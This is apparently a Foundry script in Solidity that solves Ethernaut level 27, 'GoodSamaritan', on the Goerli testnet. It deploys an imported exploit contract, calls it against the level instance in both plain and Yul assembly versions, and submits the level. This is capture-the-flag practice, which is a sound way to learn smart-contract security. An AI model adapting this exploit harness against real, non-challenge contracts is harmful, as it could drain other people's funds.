// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { GoodSamaritanExploit } from "../../contracts/27_GoodSamaritan.sol";

interface Instance {
    function wallet() external view returns (address);

    function coin() external view returns (address);

    function requestDonation() external returns (bool enoughBalance);
}

contract GoodSamaritanScript is EthernautScript {
    string network = "goerli";
    address level = 0x8d07AC34D8f73e2892496c15223297e5B22B3ABE;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        GoodSamaritanExploit exploit = new GoodSamaritanExploit();
        exploit.exploit(address(instance));
    }

    function yulVersion() internal {
        bytes memory exploitCode = type(GoodSamaritanExploit).creationCode;
        assembly {
            let exploit := create(0, add(exploitCode, 0x20), mload(exploitCode))
            mstore(0, "exploit(address)")
            mstore(0, keccak256(0, 16))
            mstore(4, sload(instance.slot))
            let success := call(gas(), exploit, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
